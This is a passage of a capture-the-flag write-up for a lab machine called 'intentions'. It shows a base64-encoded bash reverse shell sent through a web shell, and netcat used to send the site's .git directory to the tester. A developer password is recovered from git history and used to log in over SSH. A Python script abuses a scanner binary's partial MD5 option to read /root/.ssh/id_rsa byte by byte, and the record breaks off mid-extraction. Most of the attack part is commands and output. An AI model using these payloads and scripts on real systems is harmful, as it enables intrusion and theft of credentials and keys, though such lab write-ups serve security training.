> http://10.129.148.165/storage/a.php?cmd=echo%20L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjE1LzkwMDEgMD4mMScK%20%7c%20base64%20%2dd%20%7c%20bash

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.148.165] 50526
bash: cannot set terminal process group (1031): Inappropriate ioctl for device
bash: no job control in this shell
www-data@intentions:~/html/intentions/storage/app/public$
```

## Enumeration

```c
www-data@intentions:~/html/intentions/storage/app/public$ ls -la
ls -la
total 28
drwxr-xr-x 6 www-data www-data 4096 Jul  6 13:00 .
drwxr-xr-x 3 www-data www-data 4096 Feb  2 16:41 ..
-rw-r--r-- 1 www-data www-data   14 Apr 12  2022 .gitignore
drwxr-xr-x 2 root     root     4096 Feb  2 01:09 animals
drwxr-xr-x 2 root     root     4096 Feb  2 01:08 architecture
drwxr-xr-x 2 root     root     4096 Feb  2 01:07 food
drwxr-xr-x 2 root     root     4096 Feb  2 01:07 nature
```

```c
www-data@intentions:~/html/intentions$ ls -la
ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2 17:55 .
drwxr-xr-x   3 root     root       4096 Feb  2 17:55 ..
-rw-r--r--   1 root     root       1068 Feb  2 17:38 .env
drwxr-xr-x   8 root     root       4096 Feb  3 00:51 .git
-rw-r--r--   1 root     root       3958 Apr 12  2022 README.md
drwxr-xr-x   7 root     root       4096 Apr 12  2022 app
-rwxr-xr-x   1 root     root       1686 Apr 12  2022 artisan
drwxr-xr-x   3 root     root       4096 Apr 12  2022 bootstrap
-rw-r--r--   1 root     root       1815 Jan 29 19:58 composer.json
-rw-r--r--   1 root     root     300400 Jan 29 19:58 composer.lock
drwxr-xr-x   2 root     root       4096 Jan 29 19:26 config
drwxr-xr-x   5 root     root       4096 Apr 12  2022 database
-rw-r--r--   1 root     root       1629 Jan 29 20:17 docker-compose.yml
drwxr-xr-x 534 root     root      20480 Jan 30 23:38 node_modules
-rw-r--r--   1 root     root     420902 Jan 30 23:38 package-lock.json
-rw-r--r--   1 root     root        891 Jan 30 23:38 package.json
-rw-r--r--   1 root     root       1139 Jan 29 19:15 phpunit.xml
drwxr-xr-x   5 www-data www-data   4096 Feb  3 00:54 public
drwxr-xr-x   7 root     root       4096 Jan 29 19:58 resources
drwxr-xr-x   2 root     root       4096 Jun 19 11:22 routes
-rw-r--r--   1 root     root        569 Apr 12  2022 server.php
drwxr-xr-x   5 www-data www-data   4096 Apr 12  2022 storage
drwxr-xr-x   4 root     root       4096 Apr 12  2022 tests
drwxr-xr-x  45 root     root       4096 Jan 29 19:58 vendor
-rw-r--r--   1 root     root        722 Feb  2 17:46 webpack.mix.js
```

```c
www-data@intentions:~/html/intentions$ tar -czvf git.tar.gz .git/
tar -czvf git.tar.gz .git/
.git/
tar (child): git.tar.gz: Cannot open: Permission denied
tar (child): Error is not recoverable: exiting now
.git/HEAD
.git/logs/
.git/logs/HEAD
.git/logs/refs/
.git/logs/refs/heads/
.git/logs/refs/heads/master
.git/index
tar: git.tar.gz: Cannot write: Broken pipe
tar: Child returned status 2
tar: Error is not recoverable: exiting now
```

```c
www-data@intentions:/tmp$ tar -czvf git.tar.gz /var/www/html/intentions/.git/
tar -czvf git.tar.gz /var/www/html/intentions/.git/
tar: Removing leading `/' from member names
/var/www/html/intentions/.git/
/var/www/html/intentions/.git/HEAD
/var/www/html/intentions/.git/logs/
/var/www/html/intentions/.git/logs/HEAD
/var/www/html/intentions/.git/logs/refs/
/var/www/html/intentions/.git/logs/refs/heads/
/var/www/html/intentions/.git/logs/refs/heads/master
/var/www/html/intentions/.git/index
/var/www/html/intentions/.git/refs/
/var/www/html/intentions/.git/refs/tags/
/var/www/html/intentions/.git/refs/heads/
/var/www/html/intentions/.git/refs/heads/master
/var/www/html/intentions/.git/branches/
/var/www/html/intentions/.git/config
/var/www/html/intentions/.git/description
/var/www/html/intentions/.git/objects/
/var/www/html/intentions/.git/objects/3e/
/var/www/html/intentions/.git/objects/3e/bab00e5686ebddd67a9273eb3b728537f4e4cf
/var/www/html/intentions/.git/objects/3e/d5a86ead201a9e0933a15df204902fe59a5d02
/var/www/html/intentions/.git/objects/3e/aca81bede3be765d1953877e0cf27b1420b7c8
<--- SNIP --->
/var/www/html/intentions/.git/objects/65/cea21ed1e2be4ff9f1920c4236e188e32054ea
/var/www/html/intentions/.git/objects/65/c31a05bab22e11d6f3acf71dd0934204d3107a
/var/www/html/intentions/.git/objects/65/a999460170355f6383b8f122da09e66e485165
/var/www/html/intentions/.git/info/
/var/www/html/intentions/.git/info/exclude
/var/www/html/intentions/.git/COMMIT_EDITMSG
/var/www/html/intentions/.git/hooks/
/var/www/html/intentions/.git/hooks/fsmonitor-watchman.sample
/var/www/html/intentions/.git/hooks/pre-rebase.sample
/var/www/html/intentions/.git/hooks/pre-receive.sample
/var/www/html/intentions/.git/hooks/applypatch-msg.sample
/var/www/html/intentions/.git/hooks/update.sample
/var/www/html/intentions/.git/hooks/commit-msg.sample
/var/www/html/intentions/.git/hooks/pre-applypatch.sample
/var/www/html/intentions/.git/hooks/pre-merge-commit.sample
/var/www/html/intentions/.git/hooks/pre-commit.sample
/var/www/html/intentions/.git/hooks/prepare-commit-msg.sample
/var/www/html/intentions/.git/hooks/push-to-checkout.sample
/var/www/html/intentions/.git/hooks/post-update.sample
/var/www/html/intentions/.git/hooks/pre-push.sample
```

```c
$ nc -lnvp 9002 > git.tar.gz
listening on [any] 9002 ...
```

```c
www-data@intentions:/tmp$ nc 10.10.16.15 9002 < git.tar.gz
```

```c
$ tar -xvf git.tar.gz
```

```c
$ git log                                                                                                                                 
commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -> master)
Author: steve <steve@intentions.htb>
Date:   Mon Jan 30 15:29:12 2023 +0100

    Fix webpack for production

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
Author: greg <greg@intentions.htb>
Date:   Wed Jan 25 20:45:12 2023 +0100

    Adding test cases for the API!

commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
Author: steve <steve@intentions.htb>
Date:   Fri Jan 20 14:19:32 2023 +0100

    Initial v2 commit
```

```c
$ git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index f57e37b..0586d51 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         } 
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+        
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
     }
 }
```

| Password |
| --- |
| Gr3g1sTh3B3stDev3l0per!1998! |

## Privilege Escalation to greg

| Username | Password |
| --- | --- |
| greg | Gr3g1sTh3B3stDev3l0per!1998! |

```c
$ ssh greg@10.129.148.165                                                                                                   
The authenticity of host '10.129.148.165 (10.129.148.165)' can't be established.
ED25519 key fingerprint is SHA256:oM16qkT2127RdM/9i3UFwVNtt09fF4E6c4zhrHtGjw0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.148.165' (ED25519) to the list of known hosts.
greg@10.129.148.165's password: 
Permission denied, please try again.
greg@10.129.148.165's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  2 04:19:59 PM UTC 2023

  System load:           0.080078125
  Usage of /:            64.5% of 6.30GB
  Memory usage:          12%
  Swap usage:            0%
  Processes:             219
  Users logged in:       0
  IPv4 address for eth0: 10.129.148.165
  IPv6 address for eth0: dead:beef::250:56ff:fe96:ed36


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


$
```

## user.txt

```
$ cat user.txt
c6d91f95af0a1c6ab55a3e8ca9226e2c
```

## Enumeration

```c
$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
```

```c
$ sudo -l
[sudo] password for greg: 
Sorry, user greg may not run sudo on intentions.
```

```c
$ ls -la
total 52
drwxr-x--- 4 greg greg  4096 Jun 19 13:09 .
drwxr-xr-x 5 root root  4096 Jun 10 14:56 ..
lrwxrwxrwx 1 root root     9 Jun 19 13:09 .bash_history -> /dev/null
-rw-r--r-- 1 greg greg   220 Feb  2 18:10 .bash_logout
-rw-r--r-- 1 greg greg  3771 Feb  2 18:10 .bashrc
drwx------ 2 greg greg  4096 Jun 10 15:18 .cache
-rwxr-x--- 1 root greg    75 Jun 10 17:33 dmca_check.sh
-rwxr----- 1 root greg 11044 Jun 10 15:31 dmca_hashes.test
drwxrwxr-x 3 greg greg  4096 Jun 10 15:26 .local
-rw-r--r-- 1 greg greg   807 Feb  2 18:10 .profile
-rw-r----- 1 root greg    33 Jul  1 19:01 user.txt
-rw-r--r-- 1 greg greg    39 Jun 14 10:18 .vimrc
```

```c
$ cat dmca_check.sh 
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```

```c
$ cat dmca_hashes.test
DMCA-#5133:218a61dfdebf15292a94c8efdd95ee3c
DMCA-#4034:a5eff6a2f4a3368707af82d3d8f665dc
DMCA-#7873:7b2ad34b92b4e1cb73365fe76302e6bd
DMCA-#2901:052c4bb8400a5dc6d40bea32dfcb70ed
DMCA-#9112:0def227f2cdf0bb3c44809470f28efb6
DMCA-#9564:b58b5d64a979327c6068d447365d2593
DMCA-#8997:26c3660f8051c384b63ba40ea38bfc72
DMCA-#2247:4a705343f961103c567f98b808ee106d
DMCA-#6455:1db4f2c6e897d7e2684ffcdf7d907bb3
DMCA-#9245:ae0e837a5492c521965fe1a32792e3f3
DMCA-#5815:03db2633204ed6198d7ce59425480f82
DMCA-#6541:f937ea20f12e1a6ddbbcd1e6a11ada8e
DMCA-#8999:36ec86fd4521750ac1c646a22609cf2d
DMCA-#3072:744305aeff1bc6e2c4ea10b58b6fd645
DMCA-#5685:7a888ea3ea3934e3d2e61e6e72e4e074
DMCA-#8352:be6f9a5e3f6149d0ac1306272830c7ef
DMCA-#2689:e801ac5dd3fa275a8a6b475a1677863a
DMCA-#2416:acdaddd235c4280b24e48954d9c7d264
DMCA-#3935:d9c229f395d489e57dc96654f4d9ff7e
DMCA-#4455:e1a1deb184682e7bdbfbe5f8cd437caa
DMCA-#3926:be384a0febb173c74491079dc5c6dfdb
DMCA-#1098:f1ad39efe86760de7d9c5d492dfbb315
DMCA-#1710:fe3439b69d7bf0bef4cdb26b3681cd67
DMCA-#9255:ad1993e7d583b7562cd78d5c425c9914
DMCA-#6489:c4fb5aece08ac17cb997cfa08b8aa7ae
DMCA-#7139:bd2f50a66791e2da7ac057aed7d164be
DMCA-#6619:d1f93929b3b39af49cb438daf5a79524
DMCA-#3268:cbf8605ad1a412dad66162f677f33420
DMCA-#5394:f2641bee606aeec3fcb1c491d9b4b10a
DMCA-#2505:26c24d9162cc7958350199c8874cc29d
DMCA-#8744:cccebafbc3a137487352486a4a571d5b
DMCA-#2299:e0e9795f24bc3c4ad4be0932aaee8197
DMCA-#6322:9f7313330aac3cc1358697684c2c4212
DMCA-#2264:c0fba55b7528c324a519357d274e6c45
DMCA-#2536:9fb06bbf7e07d808364c4ac58b4d345b
DMCA-#1056:5ac3fe063cb2ce78a78dd3105d9d4ed7
DMCA-#9570:fe332d9f4300b93264f72a9ba5e063cd
DMCA-#6519:74b2078ffd1ee6b317808794be2e98e4
DMCA-#8225:087ff4a3ed562194410703d173670cc8
DMCA-#1952:0b3f222036dd93077a60f0e5c8ed17b4
DMCA-#9927:276aa75b371a90ebcc02a8352a8243cb
DMCA-#1977:009c3aa98a5d01908940a091f0b1f851
DMCA-#6097:585451b0357f4e3f0c0c7183bb0bfee5
DMCA-#6830:0f328e2f6126d93ed4e315d331cbd2d3
DMCA-#8555:cc935b79d02f172632de5cd4c3740484
DMCA-#2365:8b91f7d8e705177b9e037165d002c4af
DMCA-#8284:4c561bd92bb875ef6a85c31afe045dfb
DMCA-#5857:965eb8249a09c6b1fd8c41e95155ae8d
DMCA-#6588:f2d42e62b896acf6f87e82bd3d2e8446
DMCA-#6916:a28d725448adfa0ae5e3995889afb0ce
DMCA-#8699:395b264cea3a0df52976822fdd987c9b
DMCA-#4742:feff4b6810cfa12af53591a6c6858fdd
DMCA-#5768:9684d542e6ebefb3c4f4b048e722309b
DMCA-#3111:059f7f9ef1aeef7d37fd6762661f4e53
DMCA-#8700:0a09e64b07dae8133c142f66b709b224
DMCA-#4790:12b8a6da90fdf1a5598e506fff2b6a9a
DMCA-#4677:993c163be8f73b18381ab158ba215d27
DMCA-#7144:d74e855f7f4d374be4431832dd9213f4
DMCA-#6783:d1cb9ecdf723753ca8deccc10a2a5ab4
DMCA-#9410:6a849773ad8e343c56d87b85896eee7e
DMCA-#9182:7b82669cfefd0c7264489f443262a1d1
DMCA-#2921:28b605f001f6d5397fcd8a63597c0069
DMCA-#1403:dfff89821ae953481db63389aaf63333
DMCA-#8814:eaef18c114694dd6a72367bb6a0ea628
DMCA-#1901:cab16fefda7a59ceb301d88400363538
DMCA-#6041:1f97ba5a3c51f2d0e1832e25e38e1b9c
DMCA-#3323:cf1b8aff11a0be87238f06dfe31235e4
DMCA-#1700:58a7183d84777e5fd7a480fe4b385192
DMCA-#8827:cc97a122d60e02e8c74ef8bbc1eda9fa
DMCA-#1771:bad9735711ff38ac58e71c50d8e5d56e
DMCA-#3789:bc10a8d6996fa9b59464ccdb1bec1a77
DMCA-#9288:7ced2e1a61f36e9a1fb5a2305cf855f7
DMCA-#4856:f3ad2a7019ba3dfd845c95aad620eab4
DMCA-#5803:468c968b660d845583b65757b0b23b1c
DMCA-#4746:7ac5f7085f198ee9a4a351ba3a0c0ce5
DMCA-#7842:0e11263298d1f1f55f1c969a2871cf90
DMCA-#9281:023cb6520c1827d62759b39c3fc43318
DMCA-#9139:bb6108de23776c51b91774c0df50a4df
DMCA-#1976:26806efd2a2d4413346081151f86e383
DMCA-#3298:ef4a639687074229564c831607e69f97
DMCA-#7601:874815ae172b7f0f9d08d71bcd74bdbe
DMCA-#5126:67bd7f2598b6c4bb884597802f9467eb
DMCA-#5727:3948ae9622f8d61084b055e92745c4a9
DMCA-#4892:b8412bee1f341f42a1975c63cce339fb
DMCA-#4146:afb252915115fe6b2881d0488a1e9ee7
DMCA-#7317:64bb17bd98df811a3c92c378d5783582
DMCA-#7888:4799cd2fa3df1d61cb0ccea6849f1604
DMCA-#1964:a998bc56314da846dc8dc812d28a617a
DMCA-#8455:53260bf19aef7318f5e0b866ac4fa1ec
DMCA-#4295:b4677d1e60640b3a636f0fadff76f778
DMCA-#8166:9eb1d57621e89de6628c7c3739154c66
DMCA-#6750:8e9235270b0ef67776f17ed7bf505b95
DMCA-#9029:b1c9d28c897199c38314444db5ad6ab1
DMCA-#1076:e0f6bb1bfe0cafb1d55cc9617fa4aafb
DMCA-#8807:f898b1279263541d1b976e91c2aaecfd
DMCA-#5419:280c5fa2c7050242d53c5436be8b3170
DMCA-#4872:58ee6aece79c58b8d4c32cfe89b09219
DMCA-#9860:f96d40e55fc5fa3c720c30640e887f67
DMCA-#1879:619892ec61c899af8ef4a2436980d8c3
DMCA-#9821:82a7ecdb96bf325504a5a4debdca5500
DMCA-#2421:765ea54f6976a5395e0911b551504b8f
DMCA-#4673:5ac00378e3a391cce867eae217ef97c1
DMCA-#2568:487e8b30387de5457677ede7f82b880f
DMCA-#4470:32f4c99890cc2eebbd603434850ce3ce
DMCA-#3478:70ce17aad49f1e28921cf7522f1f082d
DMCA-#1939:00364ab92182c39cc24e4ad05707abe9
DMCA-#2158:984af4aea6e71a901eb2e68dd90b3721
DMCA-#2040:33e178cb805f3af58719fc5b21893d67
DMCA-#9442:16bb8afc8ef9afd70465863522562236
DMCA-#3848:82452e610dd1a4dc6022374c33881579
DMCA-#1674:216cfde6cc72e8f249645176f3a65a3b
DMCA-#7461:9988afc565e50a933bbe34c1166bff18
DMCA-#8732:986e0f0b2e267e25e0d72fdd5ee5ba5c
DMCA-#9482:ec4e084c427c2f415e9776f3ee957aca
DMCA-#3254:a88143ebf37e41a1b2eb09bfb410d3d5
DMCA-#6437:032ab5538eb3e121c33d62f1904af094
DMCA-#5820:8bfdfb57a1b5ad0bc68ea68744b0666c
DMCA-#8990:94231b0a2e3688239e16fd2c43c69220
DMCA-#2531:8d6ef76d867fccfd6dc88df45a1133e6
DMCA-#1194:b95b4ff1cd79ce801edbf3decf768725
DMCA-#5437:62dd18f6a3b555b67141e93b06354756
DMCA-#6586:ec4d8b9a7d9a33eb255f728dba1a2ee2
DMCA-#3312:84638b07ccea4d4fd1409a971a268645
DMCA-#7685:90509b459ab728835a0442062c7c2a90
DMCA-#7912:05398f5a89195b3c32bbb93febbd2cd2
DMCA-#3826:56aa39d5b4336e4b5c61a253319ecd59
DMCA-#9341:225d7ecf84785533a09d5bcd5e67f8ac
DMCA-#9406:3d1edf6dc072ace91657f8d5ba07260a
DMCA-#8208:97e7baae03d48ca2d62b5616ededd781
DMCA-#2452:e170161977c4de065762e9b0b2e08d4c
DMCA-#1887:2019cca54762b1248d843e967abed21a
DMCA-#6143:4330f43c6ad75d8b10656eac4290775f
DMCA-#2103:1ac7ad3f1d1eb31d8af607585ac3e0cd
DMCA-#8339:f185a1ecc8e9f6468a66cf66cb047fb4
DMCA-#3905:c3d310d659f7fbb47d00fce5d205c25d
DMCA-#2746:48b2c4d20727abfd9397e82f3df82bc3
DMCA-#2905:394579a4275859d96f8ce1be2f3b77fe
DMCA-#3432:b600580e5e44ab9953ae8c46f1f90159
DMCA-#4806:90839d9fe7d28d76ab7189de1cecb772
DMCA-#2631:aefb2ff2f4f5f814708005210d120ffa
DMCA-#6101:2160d281c5030a91c3805feb0d7d0235
DMCA-#5037:faf290c8b4b851f04ba7273da118bc6e
DMCA-#1894:1705c064a5149ae0309d8351cc028866
DMCA-#1233:239d8648db2b12e06569a0aad46b4f8b
DMCA-#8445:a6401c12144d5ba588567dc97d8159d2
DMCA-#7817:e6c42df60a6cd0f884c33c75fc3ea1ab
DMCA-#3504:2df007e47b0df20351eb3e547fbc09b0
DMCA-#6446:fd8c90b739a8bf4451d0e28375485f8c
DMCA-#4950:6d1605aa5112e88bddaaaf9ff60234bb
DMCA-#3403:881110281727b2063320f488f74fd334
DMCA-#5673:73fb0cd1cf11d7e6ef6326af15aa8548
DMCA-#7000:6d338541c6c73e8a827e39f649068762
DMCA-#6784:28c26da97f70b258a53b90ffc9d636ac
DMCA-#9779:8ecfefef3ccdd4bd09fa99f8ee17f014
DMCA-#4151:09bd17ff85b2143b7efda5c7b6001ec6
DMCA-#5319:a29c8b8405f4e55f7ad43bcbf5f7b052
DMCA-#4115:4c2073e030529ba1dea43fce35eca996
DMCA-#2376:7640d3caf00a22d1dfdcf043c155c3e3
DMCA-#6055:bdcac729c477a1d7f7bd165c4da547f0
DMCA-#4394:7f33655fa1c634eb607335d4df304763
DMCA-#9028:c5675d84568eb200e81856ba0ae236f8
DMCA-#3209:c71968bbb32fb9d1dece55f6315f3902
DMCA-#7516:fbaf9b5c5c8fc4b20b1dba2ec17c2a86
DMCA-#2156:2039afdf15620784385df5f880ace02c
DMCA-#7747:47d9d280b5a233acc6321b5afbe20c90
DMCA-#3000:b17bb2eb4d717cbbf111e74f69882494
DMCA-#9083:579b59f18442386314cd190addb31d70
DMCA-#1346:bc543667f3294bf14d33102c04b43e32
DMCA-#8955:f01ab14a32d8dc032f0c19c36ad5665c
DMCA-#9070:7a57eb8e02864608372d345b348f703c
DMCA-#7522:3a7ed03e2efc275ee70a0e30e9cc7554
DMCA-#3361:18b70bab19571e9e9d255d105f40af71
DMCA-#2233:b78a8c39819522e0a45cc16de56e25e4
DMCA-#3420:253991d1f7bce7ddd8113e54ae710d63
DMCA-#3696:cfbb253bd7a59f05088152e9c48f9627
DMCA-#7685:c526a40b1292ba9712d4eb0b832a2b5e
DMCA-#8969:28acd125adbc0113e8b0b09b8241c79d
DMCA-#9903:1866ddd09a032727e4a788ea85893f1f
DMCA-#3309:120057ad8c091d5ba3b6af54a8b84da2
DMCA-#8516:be45ac1d8637339c3bcc6e04b2a875cc
DMCA-#6121:3e736d21d5472e9aba8b4437b900eeac
DMCA-#4285:7896fa4865c578d5a65c9bda5ab3e43a
DMCA-#6243:051ccc3b8fd8f191ef270cf1a2f3aafd
DMCA-#8847:0140a076c0cf21d767d3ce2657304e77
DMCA-#1446:65bb72166a06d50d717e5647d3f0274e
DMCA-#4668:52950b7d9cdce2176519ada78b2b58e6
DMCA-#9442:202e866550b9d4f840a12ed262d7fa4b
DMCA-#1405:4ece1f282649b1e5a32460859070e3a6
DMCA-#1741:f63b77393b2cfdcd319ad63a31fa7a97
DMCA-#1364:326ec173224e2adbf9246d298f70da03
DMCA-#2698:04f53292ab95ade7d18e0e754f62ef14
DMCA-#3011:fe294dcb0e7ad6400f40139b2cbbcef1
DMCA-#2404:f548e8779d8a5ab0bbb041156615454a
DMCA-#7120:7e7280cbdca04a4e78c36056853c6929
DMCA-#8965:5a3ea7f575393e0f8c28a8345a68446e
DMCA-#8781:875a1a411926d4897e8ce918ae6c545c
DMCA-#1694:8e26b5bdbf7ef45b625b0cccc0f9eaa3
DMCA-#2277:da7648097cfd189c0b26b35227536a57
DMCA-#8363:5790078e17d5bb9d75a0a39f74c52fce
DMCA-#3084:3294c47765906aa7796b3ee7ccf496f5
DMCA-#2619:990df873a36c9a6099a32ae87e6dcd13
DMCA-#4694:2f8bee5fb20e1b14b7e1843e87e54de7
DMCA-#6820:4a52288b9ce5fc5c91c9de1742a37edc
DMCA-#4476:3b93ba41e9c0fde5e5f4a8169b4cf43d
DMCA-#3554:579bea51a13d10042ca3047628007d07
DMCA-#5228:534f2f830c4c6acff672c7873123e336
DMCA-#6939:b40dc67cebbb1d1e8ebaaaadd2cf111d
DMCA-#6495:2da0498985b0b100ad2879c2cde7ea61
DMCA-#9910:242f25024548123c1e70556728a711a0
DMCA-#8254:38c1864f80d419a245c08fdc13874756
DMCA-#2136:04def339208526dc4a9190ef0f8e2a4b
DMCA-#8243:9cc7918e79e10b9781e495b8c388e9d2
DMCA-#6377:9d322188eead46f80b9051a5001f7f59
DMCA-#6061:2790d44396ac968204a6e49a4e2115e6
DMCA-#3598:32f599257ccb033d35e424c41acb7db9
DMCA-#1159:c7eb0f0cb1ffc05b146cf735519ee24d
DMCA-#9129:72f05eb6918efd189d04cfb24d038289
DMCA-#4345:262b3265bc37148cec6d5816b24532a9
DMCA-#8506:87b233397d876b52dbdd2cedda5de894
DMCA-#8232:52f7d63ec258b0b4b445a1e48517f3cd
DMCA-#9606:599ff43fa35aa525ccb08492f59d2987
DMCA-#8769:d3b5afc7adfab1650546fefe5eafb03e
DMCA-#3198:2ee96c36b0d9bf55303fd93416f1863e
DMCA-#3204:90ccf20d372484179b3bb077159dd51d
DMCA-#3258:7c231ea3751a91a83bfd4903e4a14995
DMCA-#7128:adef4a077b5fbc73c1b8c58478f0b16d
DMCA-#1991:2277f2214d24861c1e2da9af7b254862
DMCA-#9030:c76081124c0b6a8b4159e46427de053a
DMCA-#2522:ce3782b9678dee75a3ddb28631920aa6
DMCA-#3596:447ea36a33b21e668dd17234d2a96414
DMCA-#9375:162e8d4144b67bc3973921c5b18ace8d
DMCA-#2349:3169c4f1a0878ea07bbf3b6b28005afd
DMCA-#9300:6f7da15b9138127d13545540db178773
DMCA-#1650:6cd84dc2d15d6236cce3b17ca5d57a32
DMCA-#6832:41963e1eb077dff6ccbe3ff37b503481
DMCA-#4550:109d0f72d8e4c42503e90599b6b40c64
DMCA-#4803:def6d13b152ae712f8ea29558127c0c5
DMCA-#7873:4b42e2ae4ddb6cc8ec0b24f780a54919
DMCA-#5696:270dcd9aa40597eb1660150959c7c2ef
DMCA-#6246:d0a5571bdf8d8608817d241fe56709e0
DMCA-#2452:026422c44c6d240e2fb4af61cfbafdaf
DMCA-#3071:e78358e2afdd6f84a284cc8bed46798e
DMCA-#3594:d725b63d93b29502ec26c4c52ec576ff
DMCA-#7057:232a80afb8e0144c68ae92be3abf2dd3
DMCA-#9277:c15a91bb6a2de1138a27150cab275f87
DMCA-#3175:8c0807ecf53c5e1a9efcfdab87ff1831
DMCA-#1997:ec9adb0f7d2343b93391d5cfacf5a31b
DMCA-#8703:4d529b70b42de543e1c38ccf00480903
DMCA-#4162:f637c4c68e67484fe82f54cb468e4969
DMCA-#7906:36cda73297f3646f080b83d2d0441a81
DMCA-#9053:e76884da2fd0ccf43b73c42f22d72e05
```

```c
$ ./dmca_check.sh
[+] DMCA-#1952 matches /home/legal/uploads/zac-porter-p_yotEbRA0A-unsplash.jpg
```

```c
$ ls -la
total 12
drwxr-xr-x  3 root root    4096 Jun 10 15:14 .
drwxr-xr-x 18 root root    4096 Jun 19 13:34 ..
drwxr-x---  2 root scanner 4096 Jun 19 11:26 scanner
```

```c
$ ls -la
total 1412
drwxr-x--- 2 root scanner    4096 Jun 19 11:26 .
drwxr-xr-x 3 root root       4096 Jun 10 15:14 ..
-rwxr-x--- 1 root scanner 1437696 Jun 19 11:18 scanner
```

```c
$ ./scanner
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

I used a random value to check if the file could read or check any given files.

```c
$ /opt/scanner/scanner -c /root/root.txt -s e76884da2fd0ccf43b73c42f22d72e05 -p
[DEBUG] /root/root.txt has hash d27dbc1e69238a8b497c1747321c8de0
```

The option `-l` offered the possibility to `brute force` files.

```c
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
```

`AROx4444` and `xvt` build a script to brute force any given file.

```c
$ cat brute.py 
#!/usr/bin/env python3

import subprocess
import hashlib
import string
import sys

content = ''
if len(sys.argv) != 3:
    print('usage: python3 x.py /root/.ssh/id_rsa 2602')
    exit(0)

file = sys.argv[1]
size = int(sys.argv[2])

for i in range(1,size):
    cmd_output = subprocess.check_output([f'/opt/scanner/scanner -c {file} -p -s 1 -l {i}'], shell=True)
    hash_res = cmd_output.decode('utf-8').split(' ')[-1].strip()
    for j in string.printable:
        if hashlib.md5(content.encode() + j.encode()).hexdigest() == hash_res:
            content += j
            print(content,end='\r')
print()
```

```c
$ cd /dev/shm
```

```c
$ cat brute.py
#!/usr/bin/env python3

import subprocess
import hashlib
import string
import sys

content = ''
if len(sys.argv) != 3:
    print('usage: python3 x.py /root/.ssh/id_rsa 2602')
    exit(0)

file = sys.argv[1]
size = int(sys.argv[2])

for i in range(1,size):
    cmd_output = subprocess.check_output([f'/opt/scanner/scanner -c {file} -p -s 1 -l {i}'], shell=True)
    hash_res = cmd_output.decode('utf-8').split(' ')[-1].strip()
    for j in string.printable:
        if hashlib.md5(content.encode() + j.encode()).hexdigest() == hash_res:
            content += j
            print(content,end='\r')
print()
```

```c
$ python3 brute.py /root/.ssh/id_rsa 2602
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
